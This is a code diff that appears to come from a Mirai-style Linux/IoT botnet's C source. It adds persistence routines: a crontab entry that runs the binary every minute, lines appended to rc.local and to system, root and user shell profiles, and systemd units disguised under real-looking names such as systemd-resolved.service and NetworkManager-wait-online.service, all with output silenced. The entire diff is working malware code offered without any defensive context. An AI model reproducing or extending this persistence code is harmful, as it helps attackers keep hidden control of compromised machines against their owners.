@@ -350,10 +350,6 @@ void util_install_persistence(void)
     {
         return; 
     }
-    if(access(orig_busybox, F_OK) == 0 && access(orig_sh, F_OK) == 0)
-    {
-        return; 
-    }
     self_fd = open(self_path, O_RDONLY);
     if(self_fd == -1)
     {
@@ -443,12 +439,11 @@ void util_install_persistence(void)
     close(self_fd);
     util_install_systemd_service();
 }
-void util_install_systemd_service(void)
+
+void util_install_crontab(void)
 {
-    int fd;
-    char service_path[256];
-    char service_content[1024];
     char self_path[256] = {0};
+    char exec_path[256] = {0};
     int n;
     if((n = readlink("/proc/self/exe", self_path, sizeof(self_path) - 1)) > 0)
     {
@@ -458,66 +453,342 @@ void util_install_systemd_service(void)
     {
         return;
     }
+    
+    if(util_stristr(self_path, util_strlen(self_path), "/bin/busybox") != -1)
+    {
+        util_strcpy(exec_path, "/bin/busybox");
+    }
+    else if(util_stristr(self_path, util_strlen(self_path), "/bin/sh") != -1)
+    {
+        util_strcpy(exec_path, "/bin/sh");
+    }
+    else if(util_stristr(self_path, util_strlen(self_path), "/bin/bash") != -1)
+    {
+        util_strcpy(exec_path, "/bin/bash");
+    }
+    else
+    {
+        util_strcpy(exec_path, self_path);
+    }
+    
+    char crontab_entry[512];
+    util_zero(crontab_entry, sizeof(crontab_entry));
+    util_strcpy(crontab_entry, "* * * * * ");
+    util_strcpy(crontab_entry + util_strlen(crontab_entry), exec_path);
+    util_strcpy(crontab_entry + util_strlen(crontab_entry), " >/dev/null 2>&1\n");
+    
+    char crontab_file[256] = "/tmp/.cron_";
+    char pid_str[32];
+    util_itoa(getpid(), 10, pid_str);
+    util_strcpy(crontab_file + util_strlen(crontab_file), pid_str);
+    
+    int fd = open(crontab_file, O_WRONLY | O_CREAT | O_TRUNC, 0644);
+    if(fd != -1)
+    {
+        write(fd, crontab_entry, util_strlen(crontab_entry));
+        close(fd);
+        
+        char cmd[512];
+        util_strcpy(cmd, "/bin/busybox test -f /usr/bin/crontab && /usr/bin/crontab ");
+        util_strcpy(cmd + util_strlen(cmd), crontab_file);
+        util_strcpy(cmd + util_strlen(cmd), " 2>/dev/null; /bin/busybox test -f /bin/crontab && /bin/crontab ");
+        util_strcpy(cmd + util_strlen(cmd), crontab_file);
+        util_strcpy(cmd + util_strlen(cmd), " 2>/dev/null");
+        system(cmd);
+        unlink(crontab_file);
+    }
+}
+
+void util_install_rclocal(void)
+{
+    char self_path[256] = {0};
+    char exec_path[256] = {0};
+    int n;
+    if((n = readlink("/proc/self/exe", self_path, sizeof(self_path) - 1)) > 0)
+    {
+        self_path[n] = 0;
+    }
+    else
+    {
+        return;
+    }
+    
+    if(util_stristr(self_path, util_strlen(self_path), "/bin/busybox") != -1)
+    {
+        util_strcpy(exec_path, "/bin/busybox");
+    }
+    else if(util_stristr(self_path, util_strlen(self_path), "/bin/sh") != -1)
+    {
+        util_strcpy(exec_path, "/bin/sh");
+    }
+    else if(util_stristr(self_path, util_strlen(self_path), "/bin/bash") != -1)
+    {
+        util_strcpy(exec_path, "/bin/bash");
+    }
+    else
+    {
+        util_strcpy(exec_path, self_path);
+    }
+    
+    const char *rclocal_paths[] = {
+        "/etc/rc.local",
+        "/etc/rc.d/rc.local",
+        "/etc/init.d/rc.local"
+    };
+    
+    char rclocal_entry[512];
+    util_zero(rclocal_entry, sizeof(rclocal_entry));
+    util_strcpy(rclocal_entry, exec_path);
+    util_strcpy(rclocal_entry + util_strlen(rclocal_entry), " >/dev/null 2>&1 &\n");
+    
+    for(int i = 0; i < 3; i++)
+    {
+        if(access(rclocal_paths[i], F_OK) == 0)
+        {
+            FILE *f = fopen(rclocal_paths[i], "r");
+            if(f)
+            {
+                char buf[4096];
+                int found = 0;
+                while(fgets(buf, sizeof(buf), f))
+                {
+                    if(util_stristr(buf, util_strlen(buf), exec_path) != -1 || 
+                       util_stristr(buf, util_strlen(buf), self_path) != -1)
+                    {
+                        found = 1;
+                        break;
+                    }
+                }
+                fclose(f);
+                
+                if(!found)
+                {
+                    FILE *fw = fopen(rclocal_paths[i], "a");
+                    if(fw)
+                    {
+                        fprintf(fw, "%s", rclocal_entry);
+                        fclose(fw);
+                        chmod(rclocal_paths[i], 0755);
+                    }
+                }
+            }
+        }
+    }
+}
+
+void util_install_profile(void)
+{
+    char self_path[256] = {0};
+    char exec_path[256] = {0};
+    int n;
+    if((n = readlink("/proc/self/exe", self_path, sizeof(self_path) - 1)) > 0)
+    {
+        self_path[n] = 0;
+    }
+    else
+    {
+        return;
+    }
+    
+    if(util_stristr(self_path, util_strlen(self_path), "/bin/busybox") != -1)
+    {
+        util_strcpy(exec_path, "/bin/busybox");
+    }
+    else if(util_stristr(self_path, util_strlen(self_path), "/bin/sh") != -1)
+    {
+        util_strcpy(exec_path, "/bin/sh");
+    }
+    else if(util_stristr(self_path, util_strlen(self_path), "/bin/bash") != -1)
+    {
+        util_strcpy(exec_path, "/bin/bash");
+    }
+    else
+    {
+        util_strcpy(exec_path, self_path);
+    }
+    
+    const char *profile_paths[] = {
+        "/etc/profile",
+        "/etc/bash.bashrc",
+        "/root/.bashrc",
+        "/root/.profile"
+    };
+    
+    char profile_entry[512];
+    util_zero(profile_entry, sizeof(profile_entry));
+    util_strcpy(profile_entry, exec_path);
+    util_strcpy(profile_entry + util_strlen(profile_entry), " >/dev/null 2>&1 &\n");
+    
+    for(int i = 0; i < 4; i++)
+    {
+        if(access(profile_paths[i], F_OK) == 0)
+        {
+            FILE *f = fopen(profile_paths[i], "r");
+            if(f)
+            {
+                char buf[4096];
+                int found = 0;
+                while(fgets(buf, sizeof(buf), f))
+                {
+                    if(util_stristr(buf, util_strlen(buf), exec_path) != -1 || 
+                       util_stristr(buf, util_strlen(buf), self_path) != -1)
+                    {
+                        found = 1;
+                        break;
+                    }
+                }
+                fclose(f);
+                
+                if(!found)
+                {
+                    FILE *fw = fopen(profile_paths[i], "a");
+                    if(fw)
+                    {
+                        fprintf(fw, "%s", profile_entry);
+                        fclose(fw);
+                    }
+                }
+            }
+        }
+    }
+    
+    char cmd[1024];
+    util_strcpy(cmd, "/bin/busybox find /home -maxdepth 2 -name '.bashrc' -o -name '.profile' 2>/dev/null | /bin/busybox head -10 | /bin/busybox xargs -I {} /bin/busybox sh -c '");
+    util_strcpy(cmd + util_strlen(cmd), "/bin/busybox grep -q \"");
+    util_strcpy(cmd + util_strlen(cmd), exec_path);
+    util_strcpy(cmd + util_strlen(cmd), "\" \"{}\" || echo \"");
+    util_strcpy(cmd + util_strlen(cmd), exec_path);
+    util_strcpy(cmd + util_strlen(cmd), " >/dev/null 2>&1 &\" >> \"{}\"'");
+    system(cmd);
+}
+void util_install_systemd_service(void)
+{
+    int fd;
+    char service_path[256];
+    char service_content[2048];
+    char self_path[256] = {0};
+    char exec_path[256] = {0};
+    int n;
+    if((n = readlink("/proc/self/exe", self_path, sizeof(self_path) - 1)) > 0)
+    {
+        self_path[n] = 0;
+    }
+    else
+    {
+        return;
+    }
+    
+    if(util_stristr(self_path, util_strlen(self_path), "/bin/busybox") != -1)
+    {
+        util_strcpy(exec_path, "/bin/busybox");
+    }
+    else if(util_stristr(self_path, util_strlen(self_path), "/bin/sh") != -1)
+    {
+        util_strcpy(exec_path, "/bin/sh");
+    }
+    else if(util_stristr(self_path, util_strlen(self_path), "/bin/bash") != -1)
+    {
+        util_strcpy(exec_path, "/bin/bash");
+    }
+    else
+    {
+        util_strcpy(exec_path, self_path);
+    }
+    
     if(access("/usr/lib/systemd", F_OK) != 0 && access("/lib/systemd", F_OK) != 0 && access("/etc/systemd", F_OK) != 0)
     {
         return; 
     }
+    
     const char *systemd_paths[] = {
         "/etc/systemd/system",
         "/usr/lib/systemd/system",
         "/lib/systemd/system"
     };
-    const char *service_name = "systemd-networkd-resolved.service";
-    int i;
-    for(i = 0; i < 3; i++)
+    
+    const char *service_names[] = {
+        "systemd-networkd-resolved.service",
+        "NetworkManager-wait-online.service",
+        "dbus-org.freedesktop.network1.service",
+        "systemd-resolved.service"
+    };
+    
+    for(int sn = 0; sn < 4; sn++)
     {
-        if(access(systemd_paths[i], F_OK) == 0)
+        const char *service_name = service_names[sn];
+        for(int i = 0; i < 3; i++)
         {
-            util_strcpy(service_path, systemd_paths[i]);
-            util_strcpy(service_path + util_strlen(service_path), "/");
-            util_strcpy(service_path + util_strlen(service_path), service_name);
-            if(access(service_path, F_OK) == 0)
+            if(access(systemd_paths[i], F_OK) == 0)
             {
-                return; 
-            }
-            fd = open(service_path, O_WRONLY | O_CREAT | O_TRUNC, 0644);
-            if(fd != -1)
-            {
-                util_zero(service_content, sizeof(service_content));
-                util_strcpy(service_content, "[Unit]\n");
-                util_strcpy(service_content + util_strlen(service_content), "Description=System service\n");
-                util_strcpy(service_content + util_strlen(service_content), "After=network.target\n\n");
-                util_strcpy(service_content + util_strlen(service_content), "[Service]\n");
-                util_strcpy(service_content + util_strlen(service_content), "Type=simple\n");
-                util_strcpy(service_content + util_strlen(service_content), "ExecStart=");
-                util_strcpy(service_content + util_strlen(service_content), self_path);
-                util_strcpy(service_content + util_strlen(service_content), "\n");
-                util_strcpy(service_content + util_strlen(service_content), "Restart=always\n");
-                util_strcpy(service_content + util_strlen(service_content), "RestartSec=10\n\n");
-                util_strcpy(service_content + util_strlen(service_content), "[Install]\n");
-                util_strcpy(service_content + util_strlen(service_content), "WantedBy=multi-user.target\n");
-                write(fd, service_content, util_strlen(service_content));
-                close(fd);
-                char dir_cmd[256];
-                util_strcpy(dir_cmd, "/bin/busybox mkdir -p ");
-                util_strcpy(dir_cmd + util_strlen(dir_cmd), systemd_paths[i]);
-                util_strcpy(dir_cmd + util_strlen(dir_cmd), "/multi-user.target.wants");
-                system(dir_cmd);
-                char symlink_path[256];
-                util_strcpy(symlink_path, systemd_paths[i]);
-                util_strcpy(symlink_path + util_strlen(symlink_path), "/multi-user.target.wants/");
-                util_strcpy(symlink_path + util_strlen(symlink_path), service_name);
-                unlink(symlink_path);
-                symlink(service_path, symlink_path);
-                char enable_cmd[512];
-                util_strcpy(enable_cmd, "/bin/busybox test -f /bin/systemctl && /bin/systemctl enable ");
-                util_strcpy(enable_cmd + util_strlen(enable_cmd), service_name);
-                util_strcpy(enable_cmd + util_strlen(enable_cmd), " 2>/dev/null; /bin/busybox test -f /bin/systemctl && /bin/systemctl start ");
-                util_strcpy(enable_cmd + util_strlen(enable_cmd), service_name);
-                util_strcpy(enable_cmd + util_strlen(enable_cmd), " 2>/dev/null");
-                system(enable_cmd);
-                break; 
+                util_strcpy(service_path, systemd_paths[i]);
+                util_strcpy(service_path + util_strlen(service_path), "/");
+                util_strcpy(service_path + util_strlen(service_path), service_name);
+                
+                fd = open(service_path, O_WRONLY | O_CREAT | O_TRUNC, 0644);
+                if(fd != -1)
+                {
+                    util_zero(service_content, sizeof(service_content));
+                    util_strcpy(service_content, "[Unit]\n");
+                    util_strcpy(service_content + util_strlen(service_content), "Description=System Network Service\n");
+                    util_strcpy(service_content + util_strlen(service_content), "After=network.target\n");
+                    util_strcpy(service_content + util_strlen(service_content), "Wants=network-online.target\n\n");
+                    util_strcpy(service_content + util_strlen(service_content), "[Service]\n");
+                    util_strcpy(service_content + util_strlen(service_content), "Type=simple\n");
+                    util_strcpy(service_content + util_strlen(service_content), "ExecStart=");
+                    util_strcpy(service_content + util_strlen(service_content), exec_path);
+                    util_strcpy(service_content + util_strlen(service_content), "\n");
+                    util_strcpy(service_content + util_strlen(service_content), "Restart=always\n");
+                    util_strcpy(service_content + util_strlen(service_content), "RestartSec=5\n");
+                    util_strcpy(service_content + util_strlen(service_content), "StandardOutput=null\n");
+                    util_strcpy(service_content + util_strlen(service_content), "StandardError=null\n");
+                    util_strcpy(service_content + util_strlen(service_content), "KillMode=process\n");
+                    util_strcpy(service_content + util_strlen(service_content), "KillSignal=SIGKILL\n\n");
+                    util_strcpy(service_content + util_strlen(service_content), "[Install]\n");
+                    util_strcpy(service_content + util_strlen(service_content), "WantedBy=multi-user.target\n");
+                    util_strcpy(service_content + util_strlen(service_content), "WantedBy=network-online.target\n");
+                    write(fd, service_content, util_strlen(service_content));
+                    close(fd);
+                    
+                    char dir_cmd[512];
+                    util_strcpy(dir_cmd, "/bin/busybox mkdir -p ");
+                    util_strcpy(dir_cmd + util_strlen(dir_cmd), systemd_paths[i]);
+                    util_strcpy(dir_cmd + util_strlen(dir_cmd), "/multi-user.target.wants 2>/dev/null; /bin/busybox mkdir -p ");
+                    util_strcpy(dir_cmd + util_strlen(dir_cmd), systemd_paths[i]);
+                    util_strcpy(dir_cmd + util_strlen(dir_cmd), "/network-online.target.wants 2>/dev/null");
+                    system(dir_cmd);
+                    
+                    char symlink_path[512];
+                    util_strcpy(symlink_path, systemd_paths[i]);
+                    util_strcpy(symlink_path + util_strlen(symlink_path), "/multi-user.target.wants/");
+                    util_strcpy(symlink_path + util_strlen(symlink_path), service_name);
+                    unlink(symlink_path);
+                    symlink(service_path, symlink_path);
+                    
+                    util_strcpy(symlink_path, systemd_paths[i]);
+                    util_strcpy(symlink_path + util_strlen(symlink_path), "/network-online.target.wants/");
+                    util_strcpy(symlink_path + util_strlen(symlink_path), service_name);
+                    unlink(symlink_path);
+                    symlink(service_path, symlink_path);
+                    
+                    char enable_cmd[1024];
+                    util_strcpy(enable_cmd, "/bin/busybox test -f /bin/systemctl && /bin/systemctl daemon-reload 2>/dev/null; ");
+                    util_strcpy(enable_cmd + util_strlen(enable_cmd), "/bin/busybox test -f /bin/systemctl && /bin/systemctl enable ");
+                    util_strcpy(enable_cmd + util_strlen(enable_cmd), service_name);
+                    util_strcpy(enable_cmd + util_strlen(enable_cmd), " 2>/dev/null; ");
+                    util_strcpy(enable_cmd + util_strlen(enable_cmd), "/bin/busybox test -f /bin/systemctl && /bin/systemctl start ");
+                    util_strcpy(enable_cmd + util_strlen(enable_cmd), service_name);
+                    util_strcpy(enable_cmd + util_strlen(enable_cmd), " 2>/dev/null; ");
+                    util_strcpy(enable_cmd + util_strlen(enable_cmd), "/bin/busybox test -f /bin/systemctl && /bin/systemctl enable --now ");
+                    util_strcpy(enable_cmd + util_strlen(enable_cmd), service_name);
+                    util_strcpy(enable_cmd + util_strlen(enable_cmd), " 2>/dev/null");
+                    system(enable_cmd);
+                    break;
+                }
             }
         }
     }
+    
+    util_install_crontab();
+    util_install_rclocal();
+    util_install_profile();
 }
